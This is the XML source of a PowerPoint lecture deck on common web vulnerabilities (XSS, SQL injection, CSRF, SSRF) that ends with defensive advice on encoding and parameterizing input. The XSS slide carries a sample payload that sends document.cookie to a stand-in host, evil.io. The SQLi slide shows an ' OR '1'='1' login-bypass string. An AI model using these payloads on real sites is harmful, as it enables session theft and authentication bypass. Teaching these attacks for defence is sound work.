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2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724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5358384" y="1234440"/>
            <a:ext cx="1463040" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C2530"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="3FB950"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="terminal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774" y="161483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LECTURE SERIES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24612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Vulnerabilities Every</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr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Must Understand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4892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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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INJECTION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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SSRF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  →  attacker.exe   |   press ▶ to continue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01 — CLIENT-SIDE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Cross-Site Scripting (XSS)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822960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C2530"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="3FB950"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 0" descr="bu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610" y="7168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injects malicious script into a trusted page. The victim's browser executes it as if the site itself wrote it — no server compromise required.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6609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 </a:t>
            </a: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Payload saved on the server (e.g. a comment) and served to every visitor.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9300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3192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 </a:t>
            </a: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Payload bounces back immediately in a URL or search response.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151376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977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DOM-based  </a:t>
            </a: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Payload never reaches the server — unsafe client-side JS executes it.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60020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comment_form.php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37960" y="2103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 submits:
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
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fetch('https://evil.io/?c='
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document.cookie)
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55046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Session/cookie theft  ·  Account takeover  ·  Site defacement  ·  Credential phishing forms injected into real pages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SECURING THE WEB  //  2 OF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 02 — SERVER-SIDE /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Injection (SQLi)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822960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C2530"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="3FB950"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 0" descr="databas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610" y="7168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input is concatenated directly into a SQL query. The attacker rewrites the query's logic, turning a login box or search field into a direct line to the database.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7523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 </a:t>
            </a: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Alters WHERE logic to bypass authentication checks.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58444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4107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Union-based  </a:t>
            </a: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Appends a UNION SELECT to pull data from other tables.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242816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069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 </a:t>
            </a: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output shown — attacker infers data via true/false timing.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60020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login.query()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37960" y="21031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into username field:
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'1'='1' -- 
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Resulting query:
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
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user='' OR '1'='1'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55046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  ·  Full data exfiltration  ·  Data tampering or deletion  ·  In some cases, OS command execution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SECURING THE WEB  //  3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845B9B-5731-CEBD-119C-B78F4CC4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51" y="386080"/>
            <a:ext cx="10100609" cy="4348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459F14-D886-4231-87C7-DC1EBC8327A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1666240" y="5506720"/>
            <a:ext cx="8491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SELECT * FROM users WHERE username = '' OR 1=1--' AND password = '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input_password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' </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="80409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qlmap: the tool that sees every SQL injection's images">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F7E5B34C-B6C6-8D22-0CAA-538783DE5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27" y="1601854"/>
            <a:ext cx="10950146" cy="365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60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QLMap Cheat Sheet">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA49BE51-E4B8-6CD5-8CF4-4655C54C3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936" y="1235895"/>
            <a:ext cx="9579505" cy="493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86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329C02-9AC0-287B-08D0-F4A687D1E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72" y="688808"/>
            <a:ext cx="10031976" cy="564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79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mpering with JWT claims">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BCD602E-3395-7A06-065E-03F922FD3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641" y="1017021"/>
            <a:ext cx="9914021" cy="502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82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5358384" y="1051560"/>
            <a:ext cx="1463040" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C2530"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="3FB950"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="lo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774" y="143195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697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trust input — from users,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr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browsers, or your own server's requests.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it. Encode it. Parameterize it. Restrict it.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53949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371</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>45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Anik sutrodhar</cp:lastModifiedBy>
  <cp:revision>6</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-08-19T20:30:55Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-20T10:29:11Z</dcterms:modified>
</cp:coreProperties>
</file>